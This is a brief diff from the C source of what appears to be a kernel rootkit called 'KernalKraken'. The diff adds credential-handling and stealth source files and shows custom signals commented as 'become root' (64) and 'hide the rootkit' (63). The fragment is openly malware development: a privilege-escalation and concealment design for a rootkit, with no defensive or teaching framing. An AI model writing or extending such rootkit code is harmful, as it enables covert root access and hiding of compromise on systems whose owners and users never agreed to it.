@@ -1,6 +1,9 @@
 #include<headers/hooks.h>
 #include<headers/KernalKraken.h>
 
+#include<src/credentials.c>
+#include<src/stealth.c>
+
 enum signals{
     SIGSUPER = 64, // become root
     SIGINVIS = 63, // hide the rootkit
